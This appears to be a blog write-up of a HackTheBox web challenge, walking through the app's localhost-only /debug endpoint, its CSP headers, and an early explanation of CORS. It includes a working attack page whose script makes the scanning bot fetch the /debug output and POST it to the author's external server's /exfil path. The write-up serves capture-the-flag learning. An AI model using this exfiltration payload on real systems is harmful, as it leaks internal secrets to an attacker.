---
title: HTB Insane Web OOPArtDB
description: Hardest challenge on HTB
date: 2024-02-20 02:45:01-0700
image: img/hackthebox.jpg
categories:
    - HackTheBox
tags:
    - web
    - htb
    - insane
---

## Intro

This challenge allows you to submit a URL to be "scanned" by a bot on the challenge server.
The flag is shown in the webapp once you have successfully accessed the appropriate page with the credentials of the "Overseer" user.

## Foothold

One of the first things I noticed in the source code, was the `/debug` and `/register` endpoint.
The `/debug` endpoint caught my attention because it could reveal the secret `REFERRAL_TOKEN` value which is required to register via `/register` as the higher privilege `researcher` type of user.

```js
// challenge/index.js

app.get("/debug", util.isLocalhost, (req, res) => {
    let utils = require("util");
    res.end(
        Object.getOwnPropertyNames(global)
        .map(n => `${n}:\n${utils.inspect(global[n])}`)
        .join("\n\n")
    );
});
```

When accessed via a GET request from localhost, it responds with a detailed inspection of all properties of the global object in Node.js.
It's a way to inspect the global environment for debugging purposes.
In all honesty, at this point I couldn't see how I could leverage this to get the flag, but it seemed like a good step up since I was obtaining higher permissions.
This is probably something I need to work on for the future.
This is clearly SSRF, but we can't see the output of the response, so we also need to combine it with a way to exfiltrate the response.
So then my next thought was to submit a URL I control.
The URL will contain a webpage that contains a script that will make a request to the `/debug` endpoint, and then submit the response from that request back to my own web server.

I hosted a web page on an EC2 instance, and had the following page:

```html
<html>
    <script>
        setTimeout(() => {
            fetch('http://localhost/debug', { method: 'GET' }).then(response => {
                    return response.text();
            }).then(data => {
                    setTimeout(() => {
                            fetch('http://54.242.152.96/exfil', {
                                    method: 'POST',
                                    body: data
                            });
                    }, 1500);
                })
        }, 1500);
    </script>
</html>
```

This somewhat worked, but I wasn't able to receive the request to exfil.

![First request received](img/2.png)

This request could have gotten blocked due to the CORS policy, and upon some research it seemed that `http.server` does not allow controlling the `CORS` header from the commandline.
However, it is possible with a little scripting and help from [stackoverflow](https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server)

Then we can verify it worked with burpsuite.
I blurred out the IP address of my EC2 instance since I don't want it getting touched :).

![Initial Request](img/3.png) ![Response with CORS policy](img/4.png) ![Request to `/debug`](img/5.png) ![Request to `/debug` received](img/6.png)

However, the POST request never went out.
This was again due to the CORS policy on my local `http.server` not havint the correct value, which then made me look into what the CORS and CSP policy was on the actual challenge.

```javascript
app.use((req, res, next) => {
    // no XSS or iframing :>
    res.setHeader("Content-Security-Policy", `
        default-src 'self';
        style-src 'self' https://fonts.googleapis.com;
        font-src https://fonts.gstatic.com;
        object-src 'none';
        base-uri 'none';
        frame-ancestors 'none';
    `.trim().replace(/\s+/g, " "));
    res.setHeader("X-Frame-Options", "DENY");
    next();
});
```

I couldn't find anything to indicate what the CORS policy was so I assumed it was as strict as possible.
My testing also implied this, so now is the time to think of how to bypass it.

### CORS

CORS is a policy defined by the web server that determines what requests it will accept.
If you intercept a response from a web server with a CORS policy you will see the header:

```
Access-Control-Allow-Origin: *
```

This header can have multiple values to specify multiple domains, or a wildcard as shown above, or a `null` value.
It makes sense too because a site that holds private information probably doesn't want to share information to applications outside of its domain.
Anyways, there are 2 parts to CORS.
There is a preflight request that happens from the client to the web server to ensure that the cross-site request is allowed, and then the actual request.



